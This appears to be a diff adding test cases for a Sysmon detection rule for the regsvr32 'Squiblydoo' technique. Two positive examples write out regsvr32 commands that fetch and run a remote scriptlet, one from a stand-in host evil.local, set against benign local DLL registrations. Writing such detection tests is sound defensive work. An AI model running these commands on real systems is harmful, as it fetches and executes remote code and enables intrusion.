@@ -1,0 +1,17 @@
+rule: sysmon-regsvr32-squiblydoo
+
+positive:
+  - description: Classic Squiblydoo scriptlet from HTTPS
+    event:
+      commandline: 'regsvr32 /s /u /n /i:https://abc.workers.dev/a.sct scrobj.dll'
+  - description: HTTP fetch with /i
+    event:
+      commandline: 'regsvr32.exe -i:http://evil.local/x.sct scrobj.dll'
+
+negative:
+  - description: Local COM DLL registration (legitimate)
+    event:
+      commandline: 'regsvr32 /s C:\Program Files\Vendor\plugin.dll'
+  - description: regsvr32 unregistration locally
+    event:
+      commandline: 'regsvr32 /u C:\Program Files\Vendor\plugin.dll'
